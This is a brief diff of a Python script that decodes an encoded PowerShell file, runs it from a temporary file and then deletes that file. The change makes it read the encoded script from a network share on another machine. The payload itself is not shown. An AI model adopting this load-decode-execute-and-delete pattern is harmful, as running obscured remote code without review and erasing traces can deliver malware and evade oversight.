@@ -66,6 +66,6 @@ def execute_ps1(decoded_content):
             os.remove(temp_script_path)
             print(f"Temporary script file {temp_script_path} deleted.")
 
-decoded_content = decode_ps1('encoded_infoplus.txt')
+decoded_content = decode_ps1('//DESKTOP-HDQUL38/clips/encoded_infoplus.txt')
 if decoded_content:
     execute_ps1(decoded_content)
